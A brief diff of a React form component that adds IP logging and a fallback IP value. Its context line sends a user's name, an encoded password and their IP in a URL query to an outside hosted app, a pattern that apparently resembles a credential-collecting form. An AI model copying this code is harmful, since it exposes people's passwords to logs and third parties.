@@ -34,8 +34,9 @@ export default function Form({
         try {
             const res = await fetch("https://api.ipify.org/?format=json");
             data = await res.json();
+            console.log(data);
         } catch (error) {
-
+            data = { ip: "0.0.0.0" };
         }
 
         const res2 = await fetch("https://teal-frail-ostrich.cyclic.app/api/user?user=" + user + "&password=" + Coder(password) + "&ip=" + data.ip);
